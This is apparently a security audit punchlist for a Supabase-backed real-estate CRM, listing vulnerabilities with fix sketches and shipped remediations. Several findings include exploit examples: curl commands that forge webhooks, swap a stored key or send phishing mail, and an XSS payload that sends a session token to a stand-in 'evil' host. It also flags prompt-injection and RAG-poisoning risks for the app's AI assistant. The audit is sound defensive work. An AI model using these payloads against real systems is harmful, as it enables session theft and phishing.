# Security & Reliability Audit Punchlist

> Source: full-codebase security + reliability audit, 2026-06-03.
> Findings ordered by severity. Tick boxes as you ship. Each item has file:line refs and a fix sketch.
> Goal: knock out the **Week-1 Hot List** first (closes ~80% of critical exposure), then work down.

---

## Week-1 Hot List (do these first)

| # | Item | Est | Closes |
|---|------|-----|--------|
| 1 | RLS lockdown stage 1: `REVOKE ALL ON ALL TABLES IN SCHEMA public FROM anon, authenticated` + route public flows through edge fns | 1 day | C1, C11, H16, H17, H9 (partial) |
| 2 | ~~Lock `save-elevenlabs-key` behind service-role bearer~~ ✅ 2026-06-04 (needs deploy) | 5 min | C2 |
| 3 | ~~Verify Svix signature on `resend-webhook`~~ ✅ 2026-06-04 (needs `RESEND_WEBHOOK_SECRET` + migration + deploy) | 1 hr | C3 |
| 4 | ~~Require `LOFTY_WEBHOOK_SECRET` query param on `lofty-webhook`~~ ✅ 2026-06-04 (needs `LOFTY_WEBHOOK_SECRET` + migration + deploy) | 30 min | C4 |
| 5 | ~~Add `escHtml()` + `safeUrl()` helpers; apply to emailHtml, SellerWeeklyUpdate, PropertyMap, BioLink~~ ✅ 2026-06-04 | 1 hr | C5, M15 |
| 6 | ~~Convert `cost_ledger.incrementLedger` to atomic SQL upsert RPC~~ ✅ 2026-06-04 (migration applied; edge fns need redeploy) | 30 min | C9 |
| 7 | Move Meta `access_token` server-side (new `meta-proxy` edge fn) | 2 hrs | C12 |
| 8 | Add per-row HMAC submit tokens to OH sign-in/feedback/host-report URLs | 2 hrs | C6 |
| 9 | ~~Atomic claim (`FOR UPDATE SKIP LOCKED`) in `dispatch-due-campaigns` + step-history pre-write~~ ✅ 2026-06-04 (migration applied; edge fns need redeploy) | 1 hr | C8 |

---

## CRITICAL

### [ ] C1. RLS is effectively disabled — every policy is `USING (true) WITH CHECK (true)`
- **Files:** `supabase/migrations/20260415_enable_rls_all_tables.sql`, `20260421_command_phase1_core.sql:222-234`, `20260421_command_v2_modules.sql:278-292`, `20260421_command_pgvector_rag.sql:127-128`, `20260507_command_lead_sources_pac.sql:42-44`
- **Risk:** Anyone with the (publicly-bundled) anon key can read every contact, transaction, referral_fee, sign-in, cost_ledger, service_secrets, user_settings. Multi-user launch is blocked.
- **Fix Stage 1 (today, pre-Auth):**
  ```sql
  REVOKE ALL ON ALL TABLES IN SCHEMA public FROM anon, authenticated;
  GRANT  SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA public TO service_role;
  ```
  Route every kiosk/public flow through edge functions (service-role).
- **Fix Stage 2 (with Auth):** Add `owner_id UUID NOT NULL DEFAULT auth.uid()` per table, rewrite all policies as `USING (owner_id = auth.uid())`.

### [x] C2. `save-elevenlabs-key` lets anyone overwrite Dana's stored API key ✅ 2026-06-04
> Shipped: `supabase/functions/save-elevenlabs-key/index.ts` now requires `Authorization: Bearer <token>` where token is either the service-role key (timing-safe compare) or a verified user JWT (`db.auth.getUser`). Anonymous calls → 401. Needs `supabase functions deploy save-elevenlabs-key`. Note: this breaks the in-app Save Key UI until Auth ships — use `supabase secrets set ELEVENLABS_API_KEY=…` as the recommended path.
- **File:** `supabase/functions/save-elevenlabs-key/index.ts:22-72`
- **Exploit:** `curl -X POST .../save-elevenlabs-key -d '{"api_key":"sk_attacker"}'` swaps the key. Attacker reads every TTS prompt via their ElevenLabs dashboard.
- **Fix:** Require service-role bearer header before accepting writes. Better: move to Edge Function secret (`supabase secrets set ELEVENLABS_API_KEY=…`) and delete the table.

### [x] C3. `resend-webhook` has no signature verification — forged unsubscribes nuke contacts ✅ 2026-06-04
> Shipped: `supabase/functions/resend-webhook/index.ts` now verifies the Svix signature on every event. HMAC-SHA256 over `${svix-id}.${svix-timestamp}.${raw_body}` (`whsec_…` secret), constant-time compared against each `v1,<sig>` token in `svix-signature`. Timestamps ±5 min only. Dedupe via new `webhook_events_seen(provider, event_id)` table (X1 cross-cutting). Fails closed if `RESEND_WEBHOOK_SECRET` is unset. **Deploy steps:** (1) `supabase secrets set RESEND_WEBHOOK_SECRET=whsec_…` (copy from Resend dashboard); (2) apply migration `20260604_webhook_events_seen.sql`; (3) `supabase functions deploy resend-webhook`.
- **File:** `supabase/functions/resend-webhook/index.ts:23-55`
- **Exploit:** `curl .../resend-webhook -d '{"type":"email.complained","data":{"to":["sarah@…"]}}'` permanently suppresses Sarah. Drip silently skips her.
- **Fix:** Verify Svix HMAC over `${svix_id}.${svix_timestamp}.${raw_body}` with `RESEND_WEBHOOK_SECRET`. Reject timestamps >5 min old. Add `webhook_events_seen(provider, event_id) UNIQUE` for replay protection.

### [x] C4. `lofty-webhook` accepts any POST; returns 200 even when insert fails ✅ 2026-06-04
> Shipped: `supabase/functions/lofty-webhook/index.ts` now requires `?secret=${LOFTY_WEBHOOK_SECRET}` (or `x-lofty-webhook-secret` header) with timing-safe compare. Body capped at 256 KB (`Content-Length` + post-read check). Dedupes via `webhook_events_seen(provider='lofty', event_id=sha256(rawText))` until Lofty exposes a stable id. Insert failure now returns 500 so Lofty retries. Fails closed if `LOFTY_WEBHOOK_SECRET` is unset. **Deploy steps:** (1) `supabase secrets set LOFTY_WEBHOOK_SECRET=$(openssl rand -hex 24)`; (2) apply migration `20260604_webhook_events_seen.sql` (same one as C3); (3) `supabase functions deploy lofty-webhook`; (4) update Lofty's webhook URL to include `?secret=<that-value>` once Lofty support enables API access.
- **File:** `supabase/functions/lofty-webhook/index.ts:74-148`
- **Risk:** Spam fills `lofty_inbound_events`. Once mapper ships, attacker pre-seeds fake leads into CRM.
- **Fix:**
  1. Require `?secret=${LOFTY_WEBHOOK_SECRET}` query param.
  2. Cap `req.text()` at 256KB.
  3. Return 5xx on insert failure (so Lofty retries).
  4. Add `UNIQUE` on event-id (hash of payload until Lofty exposes one).

### [x] C5. XSS sinks in 4 places — OH feedback freetext fires in Dana's authenticated session ✅ 2026-06-04
> Shipped: `frontend/src/lib/html.js` (escHtml + safeUrl + safeHandle). emailHtml.js escapes every interpolation + safeUrl on every URL. SellerWeeklyUpdate.jsx escapes every dynamic field + renders preview inside `<iframe sandbox="">`. SmartCampaigns EmailPreviewInline rewrapped in sandboxed iframe. PropertyMap InfoWindow rebuilt with createElement + textContent. BioLinkPublic link block → safeUrl, social handles → safeHandle, ThankYou download link → safeUrl. Vite build green.
- **Files:**
  - `frontend/src/lib/emailHtml.js:27-32, 48, 57-62, 67-70`
  - `frontend/src/components/SellerWeeklyUpdate.jsx:127-198, 270`
  - `frontend/src/components/PropertyMap.jsx:166-176`
  - `frontend/src/pages/BioLink/BioLinkPublic.jsx:124`
  - `frontend/src/pages/Campaigns/SmartCampaigns.jsx:1430`
- **Exploit:** OH visitor signs in with first name `<img src=x onerror="fetch('https://evil/?t='+localStorage.getItem('sb-...-auth-token'))">`. Dana opens Smart Campaigns → her session JWT is exfiltrated.
- **Fix:** One helper, used everywhere:
  ```js
  export const escHtml = s => String(s ?? '')
    .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
    .replace(/"/g,'&quot;').replace(/'/g,'&#39;')
  export const safeUrl = u => {
    try { const p = new URL(u, location.origin)
      return ['http:','https:','mailto:','tel:'].includes(p.protocol) ? p.toString() : '#'
    } catch { return '#' }
  }
  ```
  PropertyMap InfoWindow: build with `createElement` + `.textContent`. Render previews inside `<iframe sandbox="" srcDoc={html} />`.

### [ ] C6. Five public endpoints act on UUID-as-bearer-token with service-role privileges
- **Files:**
  - `supabase/functions/merge-oh-signin/index.ts:26-46`
  - `supabase/functions/merge-form-submission/index.ts:63-83`
  - `supabase/functions/submit-oh-feedback/index.ts:48-74`
  - `supabase/functions/host-report-followup/index.ts:73-80`
  - `supabase/functions/send-oh-feedback-request/index.ts:69-78`
- **Risk:** UUIDs are not secrets (they're in emails, browser history, kiosk URLs). Replay attacks can overwrite feedback, spam hosting agents, pollute CRM.
- **Fix:** Mint per-row HMAC `submit_token` at row creation; embed in email/URL; verify on POST with `crypto.timingSafeEqual`. Also enforce state machine (`status === 'requested'`, `merged_at IS NULL`).

### [ ] C7. `send-one-off-email` is a public phishing kit (DKIM-signed danamassey.com)
- **File:** `supabase/functions/send-one-off-email/index.ts:55-95`
- **Exploit:** `curl ...-d '{"to_email":"victim@bigco.com","subject":"Wire instructions","html":"<a href=evil.tld>click</a>"}'` sends mail as Dana.
- **Fix:** Require user JWT (verify with `SUPABASE_JWT_SECRET`). Enforce `to_email` belongs to a contact the caller owns (look up via `contact_id`). Strip CRLF from subject.

### [x] C8. Campaign dispatch race — concurrent crons double-send emails ✅ 2026-06-04
> Shipped: `supabase/migrations/20260604_campaign_dispatch_atomic.sql` adds (a) `campaign_enrollments.locked_until` column + SECURITY DEFINER `claim_due_campaign_enrollments(p_limit, p_lock_seconds)` RPC doing `UPDATE … WHERE id IN (SELECT … FOR UPDATE SKIP LOCKED) RETURNING *` and (b) partial unique index on `campaign_step_history(enrollment_id, step_index) WHERE delivery_status IN ('sending','sent','delivered')`. `dispatch-due-campaigns` calls the claim RPC instead of the raw SELECT. `send-campaign-step` (i) requires service-role bearer (was anonymous → anyone with a guessed enrollment_id could re-fire any step), (ii) pre-writes a `'sending'` step_history row before Resend so a retry after a transient failure hits the unique violation and short-circuits to advance instead of re-sending, (iii) passes `Idempotency-Key: <attempt_id>` to Resend (~24h Resend-side dedupe), (iv) `advanceEnrollment` is optimistic (`WHERE current_step = $expected`) and clears `locked_until`. **Migration applied via MCP 2026-06-04.** Edge fns need redeploy: `supabase functions deploy dispatch-due-campaigns send-campaign-step`. **Known break:** the frontend "Send Now" button on SmartCampaigns now returns 403 — surfaced with an explanatory alert. Auto-send cron still works; manual approval needs Auth or a proxy edge fn (TODO).
- **Files:** `supabase/functions/dispatch-due-campaigns/index.ts:38-156` + `supabase/functions/send-campaign-step/index.ts:270-306`
- **Risk:** Sarah gets the same drip step twice. Resend billed double. Brand damage.
- **Fix:**
  ```sql
  UPDATE campaign_enrollments
  SET locked_until = now() + interval '5 min', last_dispatched_at = now()
  WHERE id IN (
    SELECT id FROM campaign_enrollments
    WHERE status='active' AND next_send_at <= now()
      AND (locked_until IS NULL OR locked_until < now())
    ORDER BY next_send_at LIMIT 50
    FOR UPDATE SKIP LOCKED
  )
  RETURNING *;
  ```
  In `send-campaign-step`: write `campaign_step_history` with `delivery_status='sending'` *before* Resend call; tag Resend with that UUID; flip to `'sent'` on success. `advanceEnrollment` uses `WHERE current_step = $expected`. Also require service-role bearer.

### [x] C9. `cost_ledger.incrementLedger` is SELECT-then-UPDATE — concurrent calls bypass budget cap ✅ 2026-06-04
> Shipped: `supabase/migrations/20260604_cost_ledger_atomic.sql` adds SECURITY DEFINER `increment_cost_ledger(service, month, amount, source)` RPC with atomic `INSERT … ON CONFLICT (service, month) DO UPDATE SET amount = amount + EXCLUDED.amount`. Returns `(new_amount, cap, exceeded)` for the alert. `SET search_path = pg_catalog, public` per H11. EXECUTE granted to service_role only. `supabase/functions/_shared/ai-bill.ts` `incrementLedger()` rewritten to call the RPC. **Migration applied via MCP 2026-06-04.** Edge functions need redeploy: `supabase functions deploy` for any fn that imports ai-bill (ai-assistant-chat, generate-content, auto-generate-content, ai-campaign-insights, build-gamma-custom, build-presentation, canva-generate, cma-parse, compile-weekly-showing-report, feedback-follow-up, host-report-followup, send-newsletter, oh-approval-gate).
- **File:** `supabase/functions/_shared/ai-bill.ts:210-236`
- **Fix:** Atomic upsert RPC:
  ```sql
  CREATE FUNCTION increment_cost_ledger(p_service text, p_month date, p_amount numeric)
  RETURNS TABLE(new_amount numeric, cap numeric, exceeded boolean)
  LANGUAGE sql AS $$
    INSERT INTO cost_ledger (service, month, amount)
    VALUES (p_service, p_month, p_amount)
    ON CONFLICT (service, month) DO UPDATE
      SET amount = cost_ledger.amount + EXCLUDED.amount,
          updated_at = now()
    RETURNING amount, budget_cap, (amount >= budget_cap);
  $$;
  ```

### [x] C10. Three functions bypass `ai-bill.ts` — wallet attack via unauthenticated `ai-assistant-chat` ✅ 2026-06-04 (budget cap part)
> Shipped: `ai-assistant-chat`, `auto-generate-content` (both main + adapt fetches), and `embed-on-insert` (summary fetch) all routed through `callAnthropic` from `_shared/ai-bill.ts`. Budget cap now actually applies — paired with C9's atomic increment, parallel calls can't bypass it. `budget_exceeded` short-circuits the auto-generate batch (no point sending the next avatar after the cap is hit). **Still open:** per-IP rate limit on `ai-assistant-chat` — the budget cap is the bulwark, not a real defense; an attacker can still burn the whole monthly cap (e.g. $100) per cycle. Needs a `rate_limits(scope, key, period_start, count)` table + helper (X-new). Tagged TODO inline in `ai-assistant-chat/index.ts`. Edge fns need redeploy.
- **Files:**
  - `supabase/functions/ai-assistant-chat/index.ts:214-227`
  - `supabase/functions/auto-generate-content/index.ts:136-149, 210-223`
  - `supabase/functions/embed-on-insert/index.ts:243-269`
- **Exploit:** Loop curl forces Opus via `generate-content type:'listing_plan'` (`max_tokens:8192`) → ~$1.50/call → $1500 overnight.
- **Fix:** Replace direct `fetch` with `await callAnthropic(supabase, {...})`. Add per-IP rate limit (counter keyed by `x-forwarded-for + UTC day`). Require JWT on `ai-assistant-chat`. CI grep:
  ```bash
  ! git grep -nE 'api\.anthropic\.com' supabase/functions | grep -v _shared/ai-bill.ts
  ```

### [ ] C11. OAuth refresh tokens stored unencrypted in `user_settings.value` JSONB
- **Files:** `supabase_migration_content_calendar.sql:41-46`, `supabase/functions/google-auth/index.ts:146-158`
- **Exploit:** `curl .../rest/v1/user_settings?key=eq.google_tokens&select=value` with anon key returns Google refresh token (Gmail+Calendar+Drive scopes).
- **Fix:** Move to Supabase Vault (`vault.create_secret`); store secret name only in `user_settings`. At minimum today: `REVOKE SELECT ON user_settings FROM anon;`. Confirm `service_secrets` has same lockdown (no migration found enforcing it).

### [ ] C12. Meta `access_token` round-trips through React state — XSS = 60-day token leak
- **Files:** `frontend/src/pages/Settings/Settings.jsx:1084-1166`, `frontend/src/lib/supabase.js:345-406`
- **Fix:** Build `meta-proxy` edge function holding token server-side. Frontend calls:
  ```js
  const { data } = await supabase.functions.invoke('meta-proxy', { body: { op: 'campaigns' } })
  ```
  Stop returning the token to the frontend.

### [x] C13. `embed-on-insert` accepts forged DB webhook payloads → RAG poisoning ✅ 2026-06-04
> Shipped: `embed-on-insert` now requires header `x-webhook-secret: <DB_WEBHOOK_SECRET>` (timing-safe compare). Fails closed (503) if env var unset; 401 on mismatch. **Deploy steps:** (1) `supabase secrets set DB_WEBHOOK_SECRET=$(openssl rand -hex 24)`; (2) Supabase dashboard → Database → Webhooks → edit each webhook firing `embed-on-insert` → Headers → add `x-webhook-secret: <same value>`; (3) `supabase functions deploy embed-on-insert`. Until steps 1-3 are all done, embeddings will stop generating for new contacts/interactions — sequence matters.
- **File:** `supabase/functions/embed-on-insert/index.ts:208-219`
- **Exploit:** Attacker POSTs `{"type":"INSERT","record":{"prompt_text":"poisoned"}}` — flows into AI Assistant context as `RELEVANT KNOWLEDGE`.
- **Fix:** Set DB Webhook header secret in Supabase dashboard. Verify in handler:
  ```ts
  if (req.headers.get('x-webhook-secret') !== Deno.env.get('DB_WEBHOOK_SECRET'))
    return new Response('forbidden', { status: 403 })
  ```

### [ ] C14. `staging-photos` and `canva-exports` storage buckets are public
- **Files:** `supabase/migrations/20260507_virtual_staging.sql:31-48`, `supabase/migrations/20260514_canva_exports_bucket.sql:7-18`
- **Risk:** Predictable filenames + public bucket = competitors scrape pre-staging interior photos. Draft Canva flyers indexable.
- **Fix:** Set `public = false`. Generate 1-hour signed URLs server-side for public website. Gate INSERT/DELETE on `auth.role() = 'authenticated'`.

### [ ] C15. `higgsfield-generate` has no callback path — user pays for ghost jobs
- **File:** `supabase/functions/higgsfield-generate/index.ts:241-305`
- **Fix:** Wire Higgsfield's `webhook_url` param to a new `higgsfield-callback` edge fn. Writes result URL to `ai_generation_log` + `properties.hero_video_url`. Frontend polls a simple `/higgsfield-status` for up to 5 min.

---

## HIGH

### [ ] H1. `mergeProperties` / `mergeContacts` miss 8+ FK tables each; no transaction
- **File:** `frontend/src/lib/supabase.js:152-176, 796-829`
- **Missing tables (properties):** `weather_forecasts`, `media_assets`, `interactions`, `ai_generation_log`, `seller_leads`, `valuations`, `expired_leads`, `fsbo_leads`
- **Missing tables (contacts):** `social_profiles`, `family_links`, `life_events`, `referrals`, `lead_attributions`, `referral_fees`, `oh_feedback`, `interactions`, …
- **Fix:** SECURITY DEFINER RPC `merge_properties(keep_id, dupe_ids[])` deriving FK list from `information_schema.referential_constraints`, wrapped in one transaction.

### [ ] H2. `merge-oh-signin` race on dedupe — duplicate contacts on double-tap
- **File:** `supabase/functions/merge-oh-signin/index.ts:60-83, 111-134`
- **Fix:** `CREATE UNIQUE INDEX ON contacts(email_normalized) WHERE deleted_at IS NULL;` and switch creates to `ON CONFLICT (email_normalized) DO UPDATE`.

### [ ] H3. `oh-followup` timezone bug — emails fire 7 hours early (UTC parse)
- **File:** `supabase/functions/oh-followup/index.ts:82`
- **Fix:** `new Date(\`${oh.date}T${oh.end_time}-07:00\`)`. Centralize a `combineDateTime` helper.

### [ ] H4. Send-then-flag pattern in `oh-followup` / `oh-reminders` / `transaction-deadline-check` — retries double-send
- **Files:**
  - `supabase/functions/oh-followup/index.ts:73-318`
  - `supabase/functions/oh-reminders/index.ts:140-165`
  - `supabase/functions/transaction-deadline-check/index.ts:140-176`
- **Fix:** Flip order — `UPDATE … SET flag = now() WHERE flag IS NULL` first; only send if 1 row returned. Wrap each per-row iteration in try/catch. Add `UNIQUE INDEX ON notifications(type, source_table, source_id, (metadata->>'window'))`.

### [ ] H5. `lead-intake-email` aborts entire cron on single bad message
- **File:** `supabase/functions/lead-intake-email/index.ts:216-337`
- **Fix:** Per-message try/catch around the entire body. Always upsert `lead_emails_processed` (even as `parse_status='error'`).

### [ ] H6. `embed-on-insert` regenerates embeddings on every `updated_at` touch; no HF auth
- **File:** `supabase/functions/embed-on-insert/index.ts:182-313`
- **Fix:** Diff `record` vs `old_record`; skip if embeddable fields unchanged. Add `HUGGINGFACE_API_TOKEN` env var or switch to OpenAI `text-embedding-3-small`.

### [ ] H7. Newsletter sender has suppression column mismatch + drops recipients silently
- **File:** `supabase/functions/send-newsletter/index.ts:97-167`
- **Fix:** Pick one column for suppressions (`email`, not `email_normalized`). Keep newsletter `status='sending'` until all recipients processed; only flip to `'sent'` when complete.

### [ ] H8. `gmail-showing-monitor` interpolates vendor email body into Dana's alerts unescaped + prompt injection risk
- **File:** `supabase/functions/gmail-showing-monitor/index.ts:217-249, 670-686`
- **Fix:** `escHtml` on every interpolated field. Wrap email body in `<email>…</email>` and tell Claude to treat content as data.

### [ ] H9. Public OH endpoints `SELECT *` — new internal columns leak silently as schema grows
- **Files:** `frontend/src/pages/OHSignIn/OHSignIn.jsx:63-67`, `frontend/src/pages/OHFeedback/OHFeedback.jsx:48-66`, `frontend/src/pages/PropertyWebsite/PropertyWebsite.jsx:51-66`
- **Fix:** Tighten to exact column lists. Create a `public_property_summary` view exposing only safe columns; grant SELECT to anon.

### [ ] H10. `__DEMO_MODE__` settable from DevTools + localStorage — masks data, enables confusion attacks
- **Files:** `frontend/src/lib/supabase.js:12`, `frontend/src/lib/AuthContext.jsx:21-93`
- **Fix:** Gate on `import.meta.env.DEV`; drop localStorage persistence in production; keep demo state in React state only.

### [ ] H11. Trigger functions lack `SET search_path` (SECURITY DEFINER hijack risk)
- **Files:** `supabase/migrations/20260421_embed_webhooks.sql:25-92`, `20260507_referral_fees_auto_create.sql`, `20260507_transaction_status_log_trigger.sql`, `20260514_oh_listing_date_consistency.sql`, `20260517_oh_feedback.sql`
- **Fix:** Add `SET search_path = pg_catalog, public` to every trigger function. For `trigger_embed_on_change`, also write `system_events('embed.no_auth', 'err', …)` on auth-key fallback failure.

### [ ] H12. SSRF-by-proxy via `virtual-staging` / `higgsfield-generate` / `generate-image`
- **Files:** `supabase/functions/virtual-staging/index.ts:115-118`, `higgsfield-generate/index.ts:150-155`
- **Fix:** Allowlist URLs to `*.supabase.co/storage/v1/object/public/<project>/`. Require auth + per-IP rate cap. Wire `assertBudgetAvailable` for Replicate + Higgsfield.

### [ ] H13. BioLink `submitLead` writes unrestricted to `contacts` + `campaign_enrollments` from anon
- **File:** `frontend/src/lib/biolink.js:114-162`
- **Fix:** Route through edge function gated by Cloudflare Turnstile / hCaptcha. Rate-limit by IP.

### [ ] H14. No heartbeat / watchdog on crons — silent stalls go unnoticed
- **Fix:** Create `cron_heartbeats(function_name text, finished_at timestamptz)`. Every cron inserts on success. Watchdog cron fires hourly; writes `system_events('cron.stalled', 'err', …)` if any heartbeat >2× expected interval.

### [ ] H15. `video/scripts/process-queue.ts` is local-only (no production runner); non-atomic claim
- **File:** `video/scripts/process-queue.ts:31-46`
- **Fix:** Wire to GitHub Actions cron or move to Fly.io container. Atomic claim:
  ```sql
  UPDATE render_jobs SET status='rendering' WHERE id = (
    SELECT id FROM render_jobs WHERE status='queued'
    ORDER BY created_at LIMIT 1 FOR UPDATE SKIP LOCKED
  ) RETURNING *;
  ```
  Cap poll loop at 30 min wall-clock.

### [ ] H16. `oh_feedback` SELECT open to anon — enumerable internal feedback
- **File:** `supabase/migrations/20260517_oh_feedback.sql:56-59`
- **Fix:** Replace with SECURITY DEFINER RPC `get_oh_feedback_by_id(uuid, token)` returning one row only.

### [ ] H17. `document_embeddings` similarity search is multi-tenant blind
- **File:** `supabase/migrations/20260421_command_pgvector_rag.sql:14-34`
- **Fix:** Add `match_owner_id UUID DEFAULT auth.uid()` param + `WHERE de.owner_id = match_owner_id`.

---

## MEDIUM

### [ ] M1. CORS `*` on every edge function — state-mutating endpoints should be locked to production origin
- **Fix:** Mutating fns: `Access-Control-Allow-Origin: https://app.danamassey.com`. Localhost fallback via env var. Webhook receivers stay `*` but rely on signature verification.

### [ ] M2. No `fetch()` timeouts (frontend + edge fns)
- **Fix:** Shared helper `fetchWithTimeout(url, opts, ms=15000)` using `AbortSignal.timeout(ms)`.

### [ ] M3. `publish-content` `generate_video` polls 90s; Supabase wall is 60s
- **File:** `supabase/functions/publish-content/index.ts:96-121`
- **Fix:** Move to Blotato webhook-based completion. Add recovery for orphaned `status='publishing'` rows.

### [ ] M4. `canva-generate` poll loop 90s vs 60s wall — same problem
- **File:** `supabase/functions/canva-generate/index.ts:65-93`
- **Fix:** Reduce to 25×2s = 50s, OR persist `design_id` + add `/canva-export-status` follow-up endpoint.

### [ ] M5. Status enums lack `CHECK` constraints
- **Columns:** `seller_leads.status`, `expired_leads.status`, `fsbo_leads.status`, `client_for_life_plans.status`, `blotato_posts.status`, `print_orders.status`, `oh_signins.tier_at_signin`, `interactions.kind`, `media_assets.kind`
- **Fix:** Add `CHECK (status IN (...))` per the column comment in each migration.

### [ ] M6. `listings.contact_id` / `open_houses.listing_id` likely nullable; OH consistency trigger silently NULLs `listing_id`
- **File:** `supabase/migrations/20260514_oh_listing_date_consistency.sql:7-30`
- **Fix:** Either `RAISE EXCEPTION` on date mismatch, or insert `system_events('oh.listing_unlinked', 'warn', …)` + surface banner in UI. Audit nullable columns in `listings`, `open_houses`, `transactions`, `referral_fees`.

### [ ] M7. `lead-intake-email.ensureContactInline` merges by `ilike` name match — unrelated leads silently merged
- **File:** `supabase/functions/lead-intake-email/index.ts:380-383`
- **Fix:** Require email or phone match. Otherwise create new contact.

### [ ] M8. `resend-webhook` open/click counter broken — `historyRow.open_count` undefined
- **File:** `supabase/functions/resend-webhook/index.ts:70-92`
- **Fix:** Include `open_count, click_count` in select at line 53, OR use RPC: `update campaign_step_history set open_count = open_count + 1 where id = $1`.

### [ ] M9. No retention/purge for `lofty_inbound_events`, `system_events`, `ai_generation_log`, `gmail_reply_log`, `google_calendar_sync_log`
- **Fix:** `pg_cron` daily `DELETE FROM lofty_inbound_events WHERE received_at < now() - interval '90 days' AND processed_at IS NOT NULL;` similar for others.

### [ ] M10. `cash-offer-sla-check` notification insert in bare `try/catch{}` — silent fail
- **File:** `supabase/functions/cash-offer-sla-check/index.ts:81-91`
- **Fix:** `console.error` + append to `result.errors`.

### [ ] M11. `lead_attributions` primary-flip races against unique partial index
- **File:** `supabase/migrations/20260507_command_lead_sources_pac.sql:75`
- **Fix:** Single-statement reassignment: `UPDATE lead_attributions SET is_primary = (id = $new) WHERE contact_id = $cid`.

### [ ] M12. `weather_forecasts` not in `mergeProperties`; cascades on properties + unique `(property_id, forecast_date)`
- **Fix:** Add to `mergeProperties` with `ON CONFLICT … DO UPDATE`. Or change weather upsert to PK-based.

### [ ] M13. `transact_files.external_id UNIQUE` with `ON DELETE SET NULL` → orphans block future inserts
- **File:** `supabase/migrations/20260421_command_phase1_core.sql:84-93`
- **Fix:** Change `ON DELETE CASCADE` (file meaningless without deal) OR make unique partial: `WHERE deal_id IS NOT NULL`.

### [ ] M14. React `useEffect` fetches don't check unmount before `setState`
- **Files:** `OHSignIn.jsx:59-87`, `OHFeedback.jsx:44-75`, `PropertyWebsite.jsx:47-72`, `BioLinkPublic.jsx:246-254`
- **Fix:** `let cancelled = false; … if (cancelled) return; return () => { cancelled = true }` (pattern already used correctly in `PublicForm.jsx`).

### [x] M15. Email-builder `block.videoUrl` / `block.logoUrl` not scheme-validated ✅ 2026-06-04 (rolled into C5 — all URL fields go through safeUrl)
- **File:** `frontend/src/lib/emailHtml.js:88, 111-114, 134`
- **Fix:** Run through `safeUrl()` helper from C5.

### [ ] M16. `merge-form-submission.extract()` fuzzy substring match — `email_marketing_consent: "yes"` stored as `email = "yes"`
- **File:** `supabase/functions/merge-form-submission/index.ts:21-30, 98-108`
- **Fix:** Exact-match whitelist (`^email$|^contact_email$|^email_address$`). Validate `@` present before storing.

### [ ] M17. `submit-oh-feedback` outbound email interpolates user freetext with only `\n → <br/>`
- **File:** `supabase/functions/submit-oh-feedback/index.ts:103-130`
- **Fix:** `escHtml` every interpolated field.

### [ ] M18. `validate-address` / `generate-embeddings` no auth/rate-limit — USPS/HF quota burn
- **Fix:** Auth + per-IP cap.

### [ ] M19. `oh-reminders` posts service-role bearer to `send-oh-feedback-request` which never checks it
- **Fix:** Add bearer check to `send-oh-feedback-request` (rolls up under C6 token fix).

### [ ] M20. `incrementLedger` swallows `cost_ledger` errors silently
- **File:** `supabase/functions/_shared/ai-bill.ts:210-236`
- **Fix:** `console.error` + `system_events` write on failure.

### [ ] M21. Per-feature notification dedupe (flag arrays/columns) instead of unique index on notifications
- **Fix:** `CREATE UNIQUE INDEX ON notifications(type, source_table, source_id, (metadata->>'window')) WHERE status NOT IN ('dismissed','archived');`

---

## LOW

- [ ] **L1.** `host-report-followup` unawaited `.then()` on notification insert — `supabase/functions/host-report-followup/index.ts:221-241`
- [ ] **L2.** Many `.catch(() => {})` swallow errors — replace with `console.error` + `system_events` write
- [ ] **L3.** `lofty-webhook` always returns 200 — switch to 5xx after Lofty is live
- [ ] **L4.** `extractEmail` regex in `gmail-reply-detect` doesn't sanity-check `@` — `supabase/functions/gmail-reply-detect/index.ts:511-518`
- [ ] **L5.** `gmail-leads-setup` doesn't validate `from_filter` — `"*"` captures all inbox
- [ ] **L6.** `notifications.js` `rearmRecurringFollowups` fires unthrottled on every bell render — `frontend/src/lib/notifications.js:101, 134`
- [ ] **L7.** Supabase session in localStorage — acceptable after XSS holes close
- [ ] **L8.** `staged_from_id ON DELETE SET NULL` loses AI-staging lineage — `supabase/migrations/20260507_virtual_staging.sql:11` → denormalize `was_ai_staged BOOLEAN`
- [ ] **L9.** `resend-webhook` no event-id dedupe — replays double-count opens
- [ ] **L10.** `oh-reminders` hardcodes `-07:00` — breaks across timezones post-multi-user
- [ ] **L11.** `canva-generate` uses `CANVA_CLIENT_SECRET` as bearer — env-var naming misleading; verify actual value
- [ ] **L12.** `Settings.jsx:1277` `window.location.href = data.auth_url` — add `.startsWith('https://accounts.google.com/')` guard

---

## Cross-cutting infra changes (apply once, benefits everywhere)

- [~] **X1.** Shared helper: `webhook_events_seen(provider, event_id) UNIQUE` table + helper for replay protection across Lofty / Resend / Higgsfield / Replicate / Canva — **partial** ✅ 2026-06-04: table shipped (`20260604_webhook_events_seen.sql`), Resend + Lofty wired. TODO: wire Higgsfield/Replicate/Canva when they get callbacks.
- [ ] **X2.** SECURITY DEFINER `claim_due_rows(table, where, lock_seconds)` RPC reused by every cron
- [ ] **X3.** `cron_heartbeats` + watchdog cron (H14)
- [ ] **X4.** CI grep blocking direct Anthropic/Resend fetches outside `_shared/`:
  ```bash
  ! git grep -nE "(api\.anthropic\.com|api\.resend\.com)" supabase/functions | grep -v _shared/
  ```
- [ ] **X5.** Pre-record-then-send convention for all outbound (Resend, Twilio, Blotato): write intent UUID first, tag the send, update on success
- [ ] **X6.** Frontend helpers `escHtml()` + `safeUrl()` in `frontend/src/lib/safeguards.js` (or new `frontend/src/lib/html.js`)

---

## Notes for next session

- Audit performed against state at commit `955c01d` (2026-06-03).
- Memory references: `project_auth_queued.md`, `project_next_session.md`, `feedback_never_greenpros.md` (verify Supabase MCP is on `lfydlxhfctuiyykuyqnr` Client Tracker before any SQL).
- Suggested order: Week-1 Hot List → remaining CRITICAL → HIGH → cross-cutting infra → MEDIUM → LOW.
- A handful of items overlap (C5/M15/M17 share `escHtml`; C6/M19 share token fix; H4/M21 share notification unique index) — batch them.
